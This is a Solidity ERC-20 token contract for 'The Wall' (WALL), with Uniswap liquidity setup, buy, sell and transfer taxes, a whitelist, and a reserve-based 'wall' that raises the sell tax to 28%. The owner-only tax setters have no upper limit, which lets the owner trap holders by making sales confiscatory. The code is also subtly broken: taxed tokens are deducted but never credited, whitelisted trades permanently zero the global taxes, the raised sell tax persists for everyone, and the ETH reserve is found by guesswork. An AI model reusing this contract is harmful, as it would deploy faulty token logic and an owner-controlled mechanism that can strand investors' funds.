// SPDX-License-Identifier: MIT


/* 
      _____                    _____                    _____                    _____                    _____                    _____            _____  
     /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \          /\    \ 
    /::\    \                /::\____\                /::\    \                /::\____\                /::\    \                /::\____\        /::\____\
    \:::\    \              /:::/    /               /::::\    \              /:::/    /               /::::\    \              /:::/    /       /:::/    /
     \:::\    \            /:::/    /               /::::::\    \            /:::/   _/___            /::::::\    \            /:::/    /       /:::/    / 
      \:::\    \          /:::/    /               /:::/\:::\    \          /:::/   /\    \          /:::/\:::\    \          /:::/    /       /:::/    /  
       \:::\    \        /:::/____/               /:::/__\:::\    \        /:::/   /::\____\        /:::/__\:::\    \        /:::/    /       /:::/    /   
       /::::\    \      /::::\    \              /::::\   \:::\    \      /:::/   /:::/    /       /::::\   \:::\    \      /:::/    /       /:::/    /    
      /::::::\    \    /::::::\    \   _____    /::::::\   \:::\    \    /:::/   /:::/   _/___    /::::::\   \:::\    \    /:::/    /       /:::/    /     
     /:::/\:::\    \  /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \  /:::/___/:::/   /\    \  /:::/\:::\   \:::\    \  /:::/    /       /:::/    /      
    /:::/  \:::\____\/:::/  \:::\    /::\____\/:::/__\:::\   \:::\____\|:::|   /:::/   /::\____\/:::/  \:::\   \:::\____\/:::/____/       /:::/____/       
   /:::/    \::/    /\::/    \:::\  /:::/    /\:::\   \:::\   \::/    /|:::|__/:::/   /:::/    /\::/    \:::\  /:::/    /\:::\    \       \:::\    \       
  /:::/    / \/____/  \/____/ \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\/:::/   /:::/    /  \/____/ \:::\/:::/    /  \:::\    \       \:::\    \      
 /:::/    /                    \::::::/    /    \:::\   \:::\    \       \::::::/   /:::/    /            \::::::/    /    \:::\    \       \:::\    \     
/:::/    /                      \::::/    /      \:::\   \:::\____\       \::::/___/:::/    /              \::::/    /      \:::\    \       \:::\    \    
\::/    /                       /:::/    /        \:::\   \::/    /        \:::\__/:::/    /               /:::/    /        \:::\    \       \:::\    \   
 \/____/                       /:::/    /          \:::\   \/____/          \::::::::/    /               /:::/    /          \:::\    \       \:::\    \  
                              /:::/    /            \:::\    \               \::::::/    /               /:::/    /            \:::\    \       \:::\    \ 
                             /:::/    /              \:::\____\               \::::/    /               /:::/    /              \:::\____\       \:::\____\
                             \::/    /                \::/    /                \::/____/                \::/    /                \::/    /        \::/    /
                              \/____/                  \/____/                  ~~                       \/____/                  \/____/          \/____/ 
                                                                                                                                                           
*
*
* The Wall - Stability growth 
* Created by Colangius 2022
* Official Website: https://thewall.finance
*
*/

pragma solidity 0.8.13;

import 'https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol';
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol';
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol";


interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
            address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
            ) external payable returns (
                uint256 amountToken, uint256 amountETH, uint256 liquidity
                );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
            ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract wall is IERC20, Ownable {
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "Wall";
    string private constant _symbol = "WALL";
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    // Token number and initial supply
    uint256 private _totalSupply = 21000000000 * 10**18; 
    uint256 private constant _initialTotalSupply = 21000000000 * 10**18; 

    mapping (address => bool) public automatedMarketMakerPairs;
    bool private isLiquidityAdded = false;
    address public liquidityWallet;
    address public marketingWallet;
    uint256 private _launchTimestamp;
    mapping (address => uint256) private addressAmount;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    mapping (address => bool) private _isExcludedFromMaxWalletLimit;
    mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
    mapping (address => bool) private _isExcludedFromFee;
    uint256 public maxTxAmount = _totalSupply;
    uint256 public maxWalletAmount = _totalSupply;

    /* Tax for operations */
    uint sellTax = 5;
    uint buyTax = 5;
    uint transferTax = 1;
    mapping (address =>bool) private whitelistedWallet;

    /* This will create the wall based on market cap */
    uint256 ethWallCurrent;       // WEI 10**18 precision
    
    uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
    // Track pair address
    address public pairAddressOfTokenETH;
    // Register price variations 
    mapping(uint => uint) public priceVariation;

    constructor() {
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapV2Router = _uniswapV2Router;
        liquidityWallet = owner();
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[deadWallet] = true;
        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[owner()] = true;
        _isExcludedFromMaxWalletLimit[deadWallet] = true;
        _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxTransactionLimit[address(this)] = true;
        _isExcludedFromMaxTransactionLimit[owner()] = true;
        _isExcludedFromMaxTransactionLimit[deadWallet] = true;
        balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    receive() external payable {} // so the contract can receive eth

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        require(amount <= _allowances[sender][_msgSender()], "ERC20: transfer amount exceeds allowance.");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        require(subtractedValue <= _allowances[_msgSender()][spender], "ERC20: decreased allownace below zero.");
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function withdrawStuckETH() external onlyOwner {
        require(address(this).balance > 0, "cannot send more than contract balance.");
        uint256 amount = address(this).balance;
        (bool success,) = address(owner()).call{value : amount}("");
        require(success, "error withdrawing ETH from contract.");
    }
    function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromMaxWalletLimit[account] != excluded, "wallet address already excluded.");
        _isExcludedFromMaxWalletLimit[account] = excluded;
    }

    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxWalletAmount, "cannot update maxWalletAmount to same value.");
        require(newValue > _totalSupply * 1 / 100, "maxWalletAmount must be >1% of total supply.");
        maxWalletAmount = newValue;
    }

    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "cannot update maxTxAmount to same value.");
        require(newValue > _totalSupply * 1 / 1000, "maxTxAmount must be > .1% of total supply.");
        maxTxAmount = newValue;
    }
    function activateTrading() external onlyOwner {
        require(!isLiquidityAdded, "you can only add liquidity once.");
        isLiquidityAdded = true;
       _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), _totalSupply, 0, 0, _msgSender(), block.timestamp);
        // Get the pair on Uniswap
        address _uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH() );
        uniswapV2Pair = _uniswapV2Pair;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        _launchTimestamp = block.timestamp;
        maxWalletAmount = _totalSupply * 2 / 100; //  2%
        maxTxAmount = _totalSupply * 2 / 100;     //  2%
        _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
        _isExcludedFromMaxTransactionLimit[_uniswapV2Pair] = true;
        // Register pair in global variable
        pairAddressOfTokenETH = _uniswapV2Pair;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "automated market maker pair is already set to that value.");
        automatedMarketMakerPairs[pair] = value;
    }

    function name() external pure returns (string memory) { return _name; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external view virtual returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "cannot transfer from the zero address.");
        require(to != address(0), "cannot transfer to the zero address.");
        require(amount > 0, "transfer amount must be greater than zero.");
        require(amount <= balanceOf(from), "cannot transfer more than balance.");

        if (from == uniswapV2Pair)  {
            
            // Check if the wallet is whitelisted or not
            if(checkWalletForWhitelisting(to))  {
                buyTax = 0;
            }
            
            if (!_isExcludedFromMaxTransactionLimit[to]) {
                require(amount <= maxTxAmount, "transfer amount exceeds the maxTxAmount.");
            }

            if (!_isExcludedFromMaxWalletLimit[to]) {
                require((balanceOf(to) + amount) <= maxWalletAmount, "expected wallet amount exceeds the maxWalletAmount.");
            }
            // Execute transaction
            addressAmount[to] = amount;
            balances[from] -= amount;
            balances[to] += amount - (amount * (buyTax) / 100);
            emit Transfer(from, to, amount - (amount * (buyTax) / 100));              
            // End of transaction
        
            // Create the wall  
            if(extractETHValueDynamicallyDiscovered() >= 1000000000000000000 )  {
                ethWallCurrent = 1000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 3000000000000000000 )  {
                ethWallCurrent = 2000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 5000000000000000000 )  {
                ethWallCurrent = 4000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 7000000000000000000 )  {
                ethWallCurrent = 5000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 9000000000000000000 )  {
                ethWallCurrent = 7000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 10000000000000000000 )  {
                ethWallCurrent = 9000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 15000000000000000000 )  {
                ethWallCurrent = 11000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 20000000000000000000 )  {
                ethWallCurrent = 15000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 40000000000000000000 )  {
                ethWallCurrent = 30000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 70000000000000000000 )  {
                ethWallCurrent = 50000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 90000000000000000000 )  {
                ethWallCurrent = 70000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 100000000000000000000 )  {
                ethWallCurrent = 90000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 150000000000000000000 )  {
                ethWallCurrent = 120000000000000000000;
            } 
            if(extractETHValueDynamicallyDiscovered() >= 170000000000000000000 )  {
                ethWallCurrent = 150000000000000000000;
            }           
            if(extractETHValueDynamicallyDiscovered() >= 200000000000000000000 )  {
                ethWallCurrent = 190000000000000000000;
            }    
            if(extractETHValueDynamicallyDiscovered() >= 300000000000000000000 )  {
                ethWallCurrent = 200000000000000000000;
            }
            if(extractETHValueDynamicallyDiscovered() >= 400000000000000000000 )  {
                ethWallCurrent = 300000000000000000000;
            }                       
            if(extractETHValueDynamicallyDiscovered() >= 600000000000000000000 )  {
                ethWallCurrent = 500000000000000000000;
            } 

            if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
                _swapTokensForETH(balanceOf(address(this)));
                payable(marketingWallet).transfer(address(this).balance);
            }
        }

        if (to == uniswapV2Pair)    {

            // Check if the wallet is whitelisted or not
            if(checkWalletForWhitelisting(from))  {
                sellTax = 0;
            }
            
            if (!_isExcludedFromMaxTransactionLimit[from]) {
                require(amount <= maxTxAmount, "transfer amount exceeds the maxTxAmount.");
            }
            
            // Check if we can sell, based on calculation over the wall. If selling is forbidden, tax is elevated to 28%
            if (extractETHValueDynamicallyDiscovered() < ethWallCurrent)    {
                // Tax is 28% but selling is possibile
                sellTax = 28;
            }
            
            // Execute transfer
            balances[from] -= amount;
            balances[to] += amount - (amount * (sellTax) / 100);
            emit Transfer(from, to, amount - (amount * (sellTax) / 100));

            if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
                _swapTokensForETH(balanceOf(address(this)));
                payable(marketingWallet).transfer(address(this).balance);
            }
        }

        if (to != uniswapV2Pair && from != uniswapV2Pair)    {

            // Check if the wallet is whitelisted or not
            if(checkWalletForWhitelisting(to) && checkWalletForWhitelisting(from))  {
                transferTax = 0;
            }
            
            if (!_isExcludedFromMaxWalletLimit[to] || !_isExcludedFromMaxWalletLimit[from]) {
                require((balanceOf(to) + amount) <= maxWalletAmount, "expected wallet amount exceeds the maxWalletAmount.");
            }

            // Execute transfer Wallet to Wallet
            balances[from] -= amount;
            balances[to] += amount - (amount * (transferTax) / 100);              
            emit Transfer(from, to, amount - (amount * (transferTax) / 100));    

            if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
                _swapTokensForETH(balanceOf(address(this)));
                payable(marketingWallet).transfer(address(this).balance);
            }
        }
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    /* Function for PAIR manipulation and calculation over MarketCap */


   function extractETHValueDynamicallyDiscovered() public view returns (uint)   {
       IUniswapV2Pair pair = IUniswapV2Pair(pairAddressOfTokenETH);
        //IERC20 token1 = IERC20(pair.token1()); // function `token1()`
        (uint Res0, uint Res1,) = pair.getReserves();
        // Problem is: i dont know and cannot know if is Res0 or Res1 the Wall token. It's quite random and i need to calculate what i'm extracting 
        // This method will return WALL. Given that i exactply know it's number.. should be easy. We know that WALL are > than ETH
        // return variable. This will be read by dAPP!
        uint returnValueOfEth;

        if (Res0 > Res1)    {
            returnValueOfEth = Res1;
        }
        else {
            returnValueOfEth = Res0;
        }
        return returnValueOfEth;
   }

    function tokenPrice() public view returns(uint)  {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddressOfTokenETH);
        //IERC20 token1 = IERC20(pair.token1()); // function `token1()`
        (uint Res0, uint Res1,) = pair.getReserves();

        // Get the right ETH variable
        uint whoIsEth;
        if (Res0 > Res1)    {
            whoIsEth = Res1;
        }
        else {
            whoIsEth = Res0;
        }

        // decimals
        uint ethInLP = whoIsEth*(10**pair.decimals());
        // Return token price (will be read by dAPP!
        return((1*ethInLP)/Res0);

   }
    /* Here all the function for varius common services */


    function setMarketingWallettAddress(address newAddress) public onlyOwner    {
        marketingWallet = newAddress;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromMaxTransactionLimit[marketingWallet] = true;
        _isExcludedFromMaxWalletLimit[marketingWallet] = true;
    }

    function getMarketingWalletAddress() public view returns (address)  {
        return marketingWallet;
    }
    
    function getSellTax() public view returns(uint)   {
        return sellTax;
    }
    
    function setSellTax(uint newTax) public onlyOwner   {
        sellTax = newTax;
    }

     function getBuyTax() public view returns(uint)   {
        return buyTax;
    }
    
    function setBuyTax(uint newTax) public onlyOwner   {
        buyTax = newTax;
    }
    
    function getTransferTax() public view returns(uint)   {
        return transferTax;
    }
    
    function setTransferTax(uint newTax) public onlyOwner   {
        transferTax = newTax;
    }

    function getCurrentEthWall() public view returns(uint256)   {
        return ethWallCurrent;
    }

    function setCurrentEthWall(uint256 newWall) public onlyOwner  {
        ethWallCurrent = newWall;
    }

    function addToWhitelist(address addressToWhitelist) public onlyOwner    {
        // Add to whitelist
        whitelistedWallet[addressToWhitelist] = true;
    }
    
    function removeFromWhitelist(address addressToRemove) public onlyOwner    {
        // Remove from whitelist
        whitelistedWallet[addressToRemove] = false;
    }

    function checkWalletForWhitelisting(address addressToCheck) public view returns(bool)   {
        return whitelistedWallet[addressToCheck];
    }

}
